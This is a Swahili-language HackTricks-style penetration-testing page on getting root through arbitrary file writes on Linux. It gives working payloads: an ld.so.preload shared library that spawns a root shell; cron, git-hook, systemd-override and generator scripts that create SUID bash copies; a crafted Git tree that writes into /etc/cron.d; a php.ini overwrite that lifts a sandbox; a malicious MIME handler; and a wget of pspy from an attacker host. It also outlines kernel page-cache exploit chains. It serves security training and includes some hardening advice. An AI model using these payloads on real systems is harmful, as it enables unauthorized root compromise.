# Uandishi wa Faili Holela kwa Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` ni orodha ya mfumo mzima ya shared objects ambazo dynamic linker hupakia kabla ya shared objects nyingine. Hali ya secure-execution huweka vizuizi vya ziada kwa upakiaji wa awali, kwa hivyo njia ya maktaba kama `/tmp/pe.so` si mbinu ya jumla kwa SUID binaries.\
Ukiweza kuunda au kurekebisha faili hii, mchakato unaopakia faili hiyo utapakia maktaba iliyoorodheshwa kabla ya shared objects zake nyingine, na hivyo kuruhusu utekelezaji wa code katika muktadha wa mchakato huo.<sup>[[12]](#references)</sup>

Kwa mfano: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### OCR output kama constrained file-write

Huduma ya OCR inayomruhusu mpigaji kuchagua jina la faili litakalohifadhiwa inaweza kugeuza maandishi yaliyotambuliwa kwenye picha kuwa primitive ya **constrained file-write**. Baiti zinazohifadhiwa ni maandishi yaliyotambuliwa, si baiti za picha, kwa hiyo kagua matokeo ya OCR ili kuona kama yana makosa ya sintaksia. Ikiwa eneo lengwa linaloruhusiwa linaweza kutekeleza maudhui ya wavuti na linakubali jina la faili la `.php`, maandishi hayo yanaweza kutekelezwa yanapoombwa. Katika MakeSense, programu ya OCR iliyofikiwa kutoka ndani ilihifadhi maandishi chini ya `/saved/`; kisha seva yake ya PHP inayoendeshwa kama root ilitekeleza faili iliyohifadhiwa kama root. Uandishi ulizuiliwa kwenye saraka hiyo, na hakuna path traversal iliyoonyeshwa.<sup>[[37]](#references)</sup>

Privilege inayopatikana wakati wa utekelezaji ni ya **mchakato unaotoa PHP**, si ya mwandishi wa OCR moja kwa moja. Thibitisha uelekezaji wa utekelezaji wa eneo lengwa na utambulisho wa runtime; mwandishi wa OCR anayeendeshwa kama root akiwa na seva ya wavuti isiyo na privilege hangemfanya PHP iendeshwe kama root.<sup>[[37]](#references)</sup> Linganisha na muundo wa moja kwa moja wa [kupakia kwenye web-root](../../pentesting-web/file-upload/).

### Git hooks

**Git hooks** ni scripts zinazoweza kutekelezwa ambazo huendeshwa kutokana na matukio katika repository, yakiwemo shughuli za commit na merge. Ikiwa **script au mtumiaji mwenye privilege** ndiye anayetekeleza shughuli hizo na mshambuliaji anaweza **kuandika kwenye folda ya `.git`**, hook inaweza kutumiwa kwa **privilege escalation**.<sup>[[13]](#references)</sup>

Kwa mfano, inawezekana **kutengeneza script** katika git repo ndani ya **`.git/hooks`** ili iweze kutekelezwa kila mara commit mpya inapoundwa:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Privileged Git tree export path traversal

Synchronizer yenye privileged inaweza kuepuka checkout na badala yake kuorodhesha repository inayoathiriwa na mshambuliaji kwa kutumia `git ls-tree`, kusoma kila blob kwa `git cat-file`, kuunganisha pathname iliyoripotiwa na staging directory, kisha kuiandika yenyewe. Hii huwa **arbitrary file write yenye privileges za synchronizer** inapounganisha `-c safe.directory=*` (inayozima ulinzi wa Git dhidi ya repository inayomilikiwa na mtumiaji tofauti) na kutokagua kama destination iko ndani ya directory inayoruhusiwa. Jina la tree-entry lililo absolute husababisha Python's `os.path.join(stage, name)` kupuuza `stage`; jina relative lenye `../` hutoroka nje wakati filesystem inapolitatua. Kwa kuwa application hutengeneza tree ghafi badala ya kuagiza Git ifanye checkout, ukataliwaji wa pathname wakati wa checkout haulindi sink.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Tafuta umbo hili la code kwenye root services, timers, deployment agents, template importers, na backup/restore jobs:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Ingizo la tree husimbikwa kama `<mode> SP <name> NUL <raw object ID>`. Chaguo la `git hash-object --literally` huruhusu kimakusudi data ya object ambayo uchanganuzi wa kawaida au `git fsck` inaweza kukataa, kwa hivyo clone ya muda inaweza kuunda tree ambayo jina lake la faili ni lengwa kamili la absolute. Mfano huu huunda blob ya faili ya cron, huifunga tree iliyoundwa kwa hila ndani ya commit, na kuhamisha branch kuielekeza; hata hivyo, kutumia mbinu hii kunahitaji ruhusa ya kusasisha repository inayotumiwa na kazi ya mtumiaji mwenye haki za juu na seva ya Git inayokubali object iliyoharibika.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Hardening lazima ihusishe uingizaji wa repository na operesheni ya mwisho ya filesystem:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Badilisha `safe.directory=*` na repository mahususi ambazo service inapaswa kuamini, na inapowezekana, endesha uchakataji wa repository bila ruhusa za root.
- Kataa majina ya absolute na sehemu yoyote ya `.` au `..` kabla ya kutengeneza faili. Baada ya kuunganisha njia, fanya canonicalization na uthibitishe kuwa lengwa limesalia ndani ya root iliyokusudiwa.
- Epuka mashindano ya symlink ya check-then-open: fungua ukitumia file descriptor ya directory inayoaminika na, kwenye Linux, tumia `openat2()` pamoja na `RESOLVE_BENEATH` na `RESOLVE_NO_SYMLINKS` kwa njia zinazodhibitiwa na mshambuliaji.
- Pendelea checkout ya kawaida kwenye directory iliyotengwa badala ya kutekeleza upya checkout kutoka kwenye matokeo ya plumbing. Ikiwa uingizaji wa raw-object unahitajika, wezesha uthibitishaji wa upande wa receive kama `receive.fsckObjects=true`; usipunguze ukali wa matokeo ya `receive.fsck.*` yanayohusu majina ya njia na yanayohitajika kukataa miti iliyoundwa kwa hila.

### Usambazaji wa usanidi wenye ruhusa za juu

Baadhi ya service za usimamizi huhifadhi hali ya mfumo inayokusudiwa kwenye faili ya usanidi na baadaye huisambaza kwa kutumia ruhusa za juu. Kwa mfano, [openmediavault huhifadhi usanidi kwenye `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html), na [interface yake ya RPC](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) inaweza kutumia mabadiliko ya service. Ikiwa akaunti yenye ruhusa za chini inaweza kuandika au kubadilisha faili hiyo, chunguza ikiwa inaweza pia kuomba usambazaji ulioidhinishwa na kama module iliyochaguliwa hutumia sehemu iliyobadilishwa kama root. Funguo za akaunti za SSH, amri zilizopangwa, na usakinishaji wa package zina masharti tofauti; kuwepo kwa faili tu au faili ya XML inayoweza kuandikwa hakuthibitishi kuwa mojawapo inawezekana. Kagua ruhusa za faili na parent, groups za mtumiaji anayeomba na ruhusa zake za RPC, toleo lililosakinishwa, na sehemu halisi inayotumia usanidi, bila kuhariri usanidi au kuendesha operesheni ya apply wakati wa uchunguzi.

Ufafanuzi wa action za Fail2Ban chini ya `/etc/fail2ban/action.d/` ni mpaka mwingine wa usanidi wenye ruhusa za juu. Mtumiaji anayeweza kuandika na kutafuta kwenye directory hiyo anaweza kubadilisha ufafanuzi wa action au kuongeza override, lakini ruhusa za directory pekee hazithibitishi utekelezaji wa code. Thibitisha kuwa jail iliyowezeshwa huchagua action iliyoathiriwa, kuwa service ya Fail2Ban huiendesha kwa ruhusa za juu, na kuwa reload/restart iliyoidhinishwa pamoja na tukio la ban linalolingana vitatokea. Ruhusa isiyohusiana ya sudo ya kuanzisha upya Fail2Ban ina umuhimu tu inapohusu uendeshaji husika wa service na ufafanuzi uliobadilishwa unapakiwa. [Usanidi wa action wa Fail2Ban](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5) unaeleza uhusiano kati ya directory ya action na jail; [action yake ya mfano](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf) inaonyesha kuwa `actionban` huendeshwa wakati wa ban kwa ruhusa za mtumiaji wa service. Kagua ruhusa na usanidi unaotumika bila kubadilisha action au kuchochea ban wakati wa uchunguzi.

Kuna mpaka tofauti pale jail ya Fail2Ban iliyowezeshwa inapotumia action ya barua pepe inayoongezewa taarifa za WHOIS. [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) ilihusisha maandishi ya WHOIS yasiyoaminika yaliyopitishwa kwa GNU mailutils `mail`, ambayo uchakataji wake wa escape ungeweza kuendesha amri. Mwandishi wa faili mwenye ruhusa za chini anaweza kushawishi jibu ikiwa anaweza kubadilisha usanidi wa kubainisha server wa **client ya WHOIS iliyochaguliwa**; [faili ya `whois.conf(5)` ya Debian](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) inaeleza faili moja ya aina hiyo, lakini njia na matumizi yake hutofautiana kulingana na usakinishaji. Kagua jail/action inayotumika, utambulisho wa service, client halisi ya WHOIS na njia ya usanidi, utekelezaji wa mail, uwezo wa kudhibiti jibu, na marekebisho ya vendor au backport iliyosakinishwa. Faili ya usanidi wa WHOIS inayoweza kuandikwa, toleo la Fail2Ban, au action ya mail pekee havithibitishi mnyororo huu; epuka kuuliza server ya nje au kuchochea ban wakati wa uchunguzi usiohusisha mabadiliko.

### Uundaji wa faili wa TFTP na hooks za package zenye ruhusa za juu

Service ya TFTP inayofikika inaweza kuvuka mpaka wa container au mtumiaji wa ndani wakati mipangilio **inayotumika** ya tftpd-hpa huiendesha kama root, huweka root ya filesystem kama directory ya `--secure`, na kuwezesha `--create`. [Mwongozo wa tftpd-hpa](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) unaeleza chaguo za uundaji na mtumiaji. Hii inaweza kutumika kuunda faili mpya kwenye directory ya usanidi yenye ruhusa za juu, ikiwemo `/etc/apt/apt.conf.d/`; huenda bado isiwezekane kubadilisha faili iliyopo. [Mwongozo wa usanidi wa APT](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) unaeleza amri za `APT::Update::Pre-Invoke`. `apt update` inayoendeshwa na root inaweza kuwa mtumiaji mwenye ruhusa za juu **tu ikiwa** inasoma faili mpya ya usanidi. Thibitisha hoja na utambulisho halisi wa daemon inayoendesha, ufikikaji wa mtandao na uchujaji wake, sera ya uundaji wa directory lengwa, wigo wa usanidi unaotumika wa APT, na uendeshaji wa baadaye wenye ruhusa za juu. Faili ya chaguomsingi, directory lengwa inayoweza kuandikwa, au amri ya APT iliyopangwa peke yake havithibitishi njia nzima. Uchunguzi wa awali unapaswa kusoma tu usanidi na metadata za ndani zenye ukubwa wenye kikomo, bila kupakia faili au kuendesha APT.

### Cron na faili za muda

Ikiwa unaweza **kuandika faili zinazohusiana na cron ambazo root huendesha**, kwa kawaida unaweza kupata utekelezaji wa code mara nyingine kazi hiyo itakapoendeshwa. Malengo yanayovutia ni pamoja na:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Crontab ya root yenyewe kwenye `/var/spool/cron/` au `/var/spool/cron/crontabs/`
- Timers za `systemd` na service zinazoanzishwa nazo

Ukaguzi wa haraka:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Njia za kawaida za matumizi mabaya:

- **Ongeza kazi mpya ya cron ya root** kwenye `/etc/crontab` au faili katika `/etc/cron.d/`
- **Badilisha script** ambayo tayari inaendeshwa na `run-parts`
- **Backdoor target ya timer iliyopo** kwa kurekebisha script au binary inayoizindua

Mfano wa payload ndogo ya cron:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

Ikiwa unaweza tu kuandika ndani ya saraka ya cron inayotumiwa na `run-parts`, weka faili inayoweza kutekelezwa humo badala yake:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Vidokezo:

- `run-parts` kwa kawaida hupuuza majina ya faili yenye nukta, kwa hiyo pendelea majina kama `backup` badala ya `backup.sh`.<sup>[[15]](#references)</sup>
- Baadhi ya mifumo hutumia timers za `systemd` badala ya cron ya kawaida, lakini wazo la kuzitumia vibaya ni lilelile: **rekebisha kile ambacho root itatekeleza baadaye**.<sup>[[20]](#references)</sup>

### Faili za Service na Socket

Ikiwa unaweza kuandika **faili za unit za `systemd`** au faili zinazorejelewa nazo, unaweza kupata code execution kama root kwa kupakia upya na kuwasha upya unit, au kwa kusubiri njia ya uanzishaji wa service/socket ianzishe.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Pia kagua ruhusa za kuandika na kutafuta kwenye saraka yenyewe ya system unit, pamoja na ACLs: mtumiaji anaweza kuunda unit mpya ndani ya `/etc/systemd/system` hata kama haruhusiwi kusoma au kuorodhesha saraka hiyo. Njia hiyo pekee haiwashi chochote. Thibitisha kuwa system manager itapakia unit mpya, kwamba anayeita ana ruhusa halali ya `systemctl start` au `restart` yenye uwezo wa root kwa jina lake (au njia nyingine ya uanzishaji yenye upendeleo), na kwamba service inaendeshwa kwa utambulisho uliokusudiwa. Unit iliyopo na iliyopakiwa ambayo imebadilishwa kwenye diski inaweza kuhitaji `daemon-reload`; unit yenye jina jipya ina tabia tofauti ya upakiaji. Kagua hoja na vizuizi kamili vya sudo kabla ya kuamua kuwa kanuni ya restart yenye wildcard inatosha. Tazama [njia ya utafutaji ya unit za systemd](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) na [semantiki za upakiaji na reload za systemctl](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html).

Malengo yanayovutia ni pamoja na:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Mabadiliko ya ziada katika `/etc/systemd/system/<unit>.d/*.conf`
- Script/binari za service zinazorejelewa na `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Njia za `EnvironmentFile=` zinazoweza kuandikwa na kupakiwa na service ya root

Ukaguzi wa haraka:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Njia za kawaida za matumizi mabaya:

- **Overwrite `ExecStart=`** katika service unit inayomilikiwa na root ambayo unaweza kuhariri
- **Add a drop-in override** yenye `ExecStart=` hasidi na kwanza uondoe ile ya zamani
- **Backdoor** script/binary ambayo tayari imerejelewa na unit
- **Hijack a socket-activated service** kwa kuhariri faili ya `.service` inayolingana, ambayo huanza socket inapopokea muunganisho

Mfano wa override hasidi:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Mtiririko wa kawaida wa uanzishaji:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

Ikiwa huwezi kuwasha upya services mwenyewe lakini unaweza kuhariri unit iliyoanzishwa na socket, huenda ukahitaji tu **kusubiri muunganisho wa client** ili kuchochea utekelezaji wa service iliyoingiziwa backdoor kama root.<sup>[[17]](#references)</sup>

### systemd generator directories

**System generators** ni executables zinazoanzishwa na system manager kabla haijapakia unit files, wakati wa kuwasha mfumo na wa kupakia upya usanidi. Kwa hiyo, ruhusa ya kuandika kwenye system-generator directory (au kwenye generator executable iliyopo) ni njia ya moja kwa moja ya root-code-execution ambayo ni rahisi kukosa ikiwa ukaguzi unatafuta faili za `*.service` na `*.timer` pekee.<sup>[[35]](#references)[[36]](#references)</sup>

Mpangilio wa kawaida wa utafutaji ni `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/`, na `/usr/lib/systemd/system-generators/` (baadhi ya distributions huonyesha `/lib/systemd/system-generators/` kupitia muunganiko wa `/usr`). Executable yenye jina sawa katika directory ya mapema zaidi hufunika ile iliyo kwenye directory ya baadaye. Usichanganye hizi **input executable directories** na `/run/systemd/generator`, `/run/systemd/generator.early`, na `/run/systemd/generator.late`, ambazo zina output ya unit za muda inayozalishwa na generators.<sup>[[35]](#references)</sup>

Ukaguzi wa haraka:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

Generator iliyoundwa upya lazima iwe na biti yake ya executable iliyowekwa. Ikiwa primitive ya kuandika inadhibiti baiti lakini si mode, lenga generator ambayo tayari inaweza kutekelezwa; kwa kawaida, kuifuta na kuiandika upya mahali pake huhifadhi metadata yake. Ikiwa directory yenyewe inaweza kuandikwa, unda entry mpya na uweke alama kuwa inaweza kutekelezwa.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

Kuanzisha `systemctl daemon-reload` dhidi ya manager ya **system** kunahitaji idhini inayofaa, lakini huendesha upya kila system generator; vinginevyo, subiri reload yenye mamlaka ya juu, operesheni ya kifurushi, au kuwasha upya mfumo. Saraka za user-generator kama `~/.config/systemd/user-generators/` huendeshwa chini ya user manager na **hazitoi root zenyewe**.<sup>[[35]](#references)</sup>

Kwa hardening na hunting, hakiki kila sehemu ya njia na ACL badala ya kuangalia bits za ruhusa za mwisho pekee, weka baseline ya hashes/umiliki wa vifurushi vya generators, na toa arifa kuhusu kuunda, kubadili jina, kubadilisha maudhui, au kubadilisha ruhusa katika saraka zote za ingizo za system-generator. Kufuatilia uandishi ni muhimu kwa sababu generator inayotekelezwa mara moja inaweza kujifuta baada ya kutekelezwa, ilhali mti wa unit uliotengenezwa chini ya `/run/systemd/generator*` hujengwa upya kwenye reload inayofuata.<sup>[[35]](#references)[[36]](#references)</sup>

### Andika juu ya `php.ini` yenye vizuizi inayotumiwa na PHP sandbox yenye mamlaka ya juu

Baadhi ya daemon maalum hukagua PHP iliyotolewa na mtumiaji kwa kuendesha `php` yenye **`php.ini` yenye vizuizi** (kwa mfano, `disable_functions=exec,system,...`). Ikiwa msimbo ulio kwenye sandbox bado una **primitive yoyote ya kuandika** (kama `file_put_contents`) na unaweza kufikia **njia halisi ya `php.ini`** inayotumiwa na daemon, unaweza **kuandika juu ya usanidi huo** ili kuondoa vizuizi, kisha utume payload ya pili itakayotekelezwa ikiwa na mamlaka ya juu.<sup>[[2]](#references)</sup>

Mtiririko wa kawaida:

1. Payload ya kwanza huandika juu ya usanidi wa sandbox.
2. Payload ya pili hutekeleza msimbo baada ya functions hatari kuwashwa tena.

Mfano mdogo (badilisha njia itumiwayo na daemon):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

Ikiwa daemon inaendeshwa kama root (au inathibitisha kwa kutumia paths zinazomilikiwa na root), utekelezaji wa pili hupata muktadha wa root. Hii kimsingi ni **privilege escalation kupitia config overwrite** wakati runtime iliyo kwenye sandbox bado inaweza kuandika faili.

### binfmt_misc

`binfmt_misc` huweka registrations chini ya `/proc/sys/fs/binfmt_misc`; kila registration huhusisha pattern ya aina ya faili na interpreter. Athari kwa privileges hutegemea nani anaweza kubadilisha registration na ni process gani baadaye hutekeleza faili linalolingana, kwa hivyo thibitisha masharti hayo kabla ya kuchukulia hili kama njia ya privilege escalation.<sup>[[21]](#references)</sup>

Helper inayotekelezeka yenye `CAP_DAC_OVERRIDE` inaweza kuwa njia tofauti ya registration ikiwa inakubali data inayodhibitiwa na mpigaji na kuiandika kwenye `/proc/sys/fs/binfmt_misc/register`, hata wakati mpigaji hawezi kuandika kwenye node hiyo moja kwa moja. Kagua ingizo na tabia ya uandishi ya helper bila kuiendesha wakati wa enumeration. Ikiwa rule iliyosajiliwa inatumia flag ya `C`, interpreter hupokea credentials kulingana na binary inayolingana; kwa hiyo, SUID match inayomilikiwa na root inaweza kuendesha interpreter inayodhibitiwa na mpigaji kama root. Thibitisha mount na sera ya registration ya `binfmt_misc`, uwezo halisi wa helper, rule na njia kamili ya interpreter, target ya SUID inayotekelezeka, na kama `no_new_privs` au mount ya `nosuid` inazuia mabadiliko ya SUID. Capability bit au maandishi ya path yaliyopachikwa pekee ni kidokezo cha kuchunguza tu.<sup>[[21]](#references)</sup> Angalia [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html) kwa masharti yanayozuia SUID.

### Kubadilisha handlers za schema (kama http: au https:)

Mazingira ya desktop hutumia MIME associations na desktop entries kuchagua programu ya kutumia kwa URI schemes; mshambuliaji anayeweza kuandika kwenye usanidi husika wa mtumiaji na directories za desktop-entry anaweza kuelekeza schemes hizo kwenye launcher anayoidhibiti. Kwa kurekebisha faili la `$HOME/.config/mimeapps.list` ili lielekeze handlers za URL za HTTP na HTTPS kwenye faili hasidi (kwa mfano, `x-scheme-handler/http=evil.desktop` na `x-scheme-handler/https=evil.desktop`), kubofya kwa mtumiaji kunaweza kuendesha desktop entry hiyo.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Root kuendesha scripts/binaries zinazoweza kuandikwa na mtumiaji

Ikiwa mtiririko wa kazi wenye ruhusa za juu unaendesha kitu kama `/bin/sh /home/username/.../script` (au binary yoyote ndani ya saraka inayomilikiwa na mtumiaji asiye na ruhusa za juu), unaweza kuuteka:<sup>[[1]](#references)</sup>

- **Tambua utekelezaji:** fuatilia michakato kwa kutumia pspy ili kunasa root ikiendesha njia zinazodhibitiwa na mtumiaji.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Thibitisha uwezo wa kuandika:** hakikisha faili lengwa na saraka yake vinamilikiwa na mtumiaji wako na unaweza kuviandikia.
- **Hijack faili lengwa:** hifadhi nakala ya binary/script asilia na uweke payload inayounda SUID shell (au kutekeleza kitendo kingine chochote cha root), kisha rejesha ruhusa:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Anzisha kitendo chenye upendeleo** (kwa mfano, kubonyeza kitufe cha UI kinachoanzisha helper). Root itakapoendesha tena njia iliyotekwa, pata shell yenye upendeleo uliopandishwa kwa `./rootshell -p`.

### Marekebisho ya faili ya binary yenye upendeleo yanayohusu page cache pekee

Baadhi ya hitilafu za kernel hazibadilishi faili **kwenye diski**. Badala yake, hukuruhusu kurekebisha **nakala ya page cache** pekee ya faili inayosomeka. Ukiweza kulenga binary ya **setuid** au inayoendeshwa na **root** kwa njia nyingine, utekelezaji unaofuata unaweza kuendesha byte zinazodhibitiwa na mshambuliaji kutoka kwenye kumbukumbu na kupandisha upendeleo, hata kama hash ya faili kwenye diski haijabadilika.<sup>[[3]](#references)[[4]](#references)</sup>

Hili linafaa kueleweka kama **primitive ya kuandika faili wakati wa runtime pekee**:<sup>[[3]](#references)</sup>

- **Diski hubaki safi**: inode na byte zilizo kwenye diski hazibadiliki
- **Kumbukumbu hubadilika**: michakato inayosoma au kutekeleza ukurasa uliohifadhiwa kwenye cache hupata maudhui yaliyorekebishwa na mshambuliaji
- **Athari ni ya muda**: mabadiliko hupotea baada ya kuwasha upya au ukurasa kuondolewa kwenye cache

Primitive hii iko kati ya **uandishi wa faili kiholela** wa kawaida na hitilafu za zamani za **matumizi mabaya ya page cache** kama Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW ilitegemea race condition
- Dirty Pipe ilikuwa na vizuizi vya nafasi ya uandishi
- Primitive ya page-cache-only inaweza kuwa ya kutegemewa zaidi ikiwa njia yenye hitilafu inaruhusu uandishi wa moja kwa moja kwenye kurasa za faili zilizo kwenye cache

#### Mtiririko wa jumla wa privesc

1. Pata primitive ya kernel inayoweza kuandika kwenye **kurasa za page cache zinazoungwa mkono na faili**
2. Itumie dhidi ya **binary yenye upendeleo inayosomeka** au faili nyingine inayoendeshwa na root
3. Anzisha utekelezaji **kabla** ukurasa haujaondolewa kwenye cache
4. Pata utekelezaji wa code kama root huku faili iliyo kwenye diski bado ikionekana kuwa haijabadilishwa

Malengo yenye thamani kubwa kwa kawaida ni:

- Binary za **setuid-root**
- Helpers zinazoanzishwa na **huduma za root**
- Binary zinazoendeshwa mara nyingi kutoka kwenye **containers zinazoshiriki kernel/page cache ya host**

#### Mfano wa njia ya AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) ni mfano mzuri wa kundi hili. Njia yenye hitilafu ilikuwa kwenye API ya Linux ya crypto userspace (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` inaweza kuhamisha marejeleo ya kurasa za page cache kutoka kwenye faili inayosomeka hadi kwenye scatterlist ya crypto TX
- njia ya `algif_aead` ya kusimbua data mahali pale ilipotoka ilitumia tena buffer za chanzo na lengwa
- `authencesn` kisha ikaandika kwenye eneo la tag la lengwa
- eneo hilo lilipokuwa bado likirejelea kurasa za faili zilizowekwa kwa `splice()`, uandishi uliingia kwenye **page cache ya faili lengwa**

Kwa hiyo, mbinu ya kuvutia si CVE yenyewe, bali muundo huu:

- **pitisha kurasa za cache zinazoungwa mkono na faili kwenye mfumo mdogo wa kernel**
- fanya mfumo huo **uzichukulie kama matokeo yanayoweza kuandikwa**
- anzisha ubadilishaji mdogo unaodhibitiwa kwenye kumbukumbu

PoC ya umma ilitumia **uandishi wa byte 4** unaorudiwa ili kubandika `/usr/bin/su` kwenye kumbukumbu, kisha ikaitekeleza.<sup>[[4]](#references)[[7]](#references)</sup>

#### Mfano wa njia ya kloni ya ESP / XFRM + netfilter TEE

DirtyClone (CVE-2026-43503) inaonyesha aina nyingine ya muundo huohuo wa **uandishi-wa-root unaohusu page-cache-only**, lakini safari hii sehemu inayopokea data ni **usimbuaji wa IPsec ESP** badala ya `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Mbinu muhimu ni hatua ya **kuficha asili ya metadata**:

- `splice()` huweka **ukurasa wa page cache unaoungwa mkono na faili na ulio wa kusoma-tu** ndani ya pakiti ya ESP-in-UDP
- kinga ya awali ya DirtyFrag iliweka alama `SKBFL_SHARED_FRAG` kwenye skb hiyo ili `esp_input()` **inukuu data kabla ya kuisimbua**
- netfilter `TEE` hurudia pakiti kupitia `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- kloni huhifadhi **rejeleo lilelile la kimwili la page cache** lakini hupoteza `SKBFL_SHARED_FRAG`
- kisha `esp_input()` huchukulia kloni kuwa salama na kuendesha usimbuaji wa **`cbc(aes)` mahali pale pale** kwenye ukurasa unaoungwa mkono na faili

Kwa hiyo, funzo kwa wakaguzi ni pana zaidi ya CVE hii: ikiwa kinga inategemea **metadata ya skb/ukurasa** kuamua kama operesheni lazima inakili data kwanza, njia yoyote ya **kloni/nakala inayohifadhi ukurasa wa msingi lakini kuondoa metadata** inaweza kufungua tena primitive ya uandishi bila kuonekana.

Mtiririko wa kawaida wa unyonyaji:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` ili kupata **`CAP_NET_ADMIN` ndani ya network namespace ya faragha**
2. washa loopback na usakinishe sheria ya **netfilter `TEE`** katika `mangle/OUTPUT`
3. sakinisha XFRM ESP transport SA kupitia `NETLINK_XFRM`
4. weka kila neno lengwa la byte 4 kwenye sehemu ya SA `seq_hi` (ujanja wa kuchagua neno wa DirtyFrag)
5. tuma pakiti ya ESP-in-UDP iliyopitishwa kwa `splice()` ili **kloni ya TEE** ifike kwenye `esp_input()` na isimbuliwe **mahali pale pale**
6. rudia hadi nakala ya page cache ya `/usr/bin/su` au executable nyingine yenye upendeleo iwe na code inayodhibitiwa na mshambuliaji

Kwa upande wa utendaji, athari ni sawa na mfano wa `AF_ALG`: faili kwenye diski hubaki safi, lakini `execve()` hutumia **byte zilizobadilishwa kwenye page cache** na kutoa root.<sup>[[8]](#references)[[9]](#references)</sup>

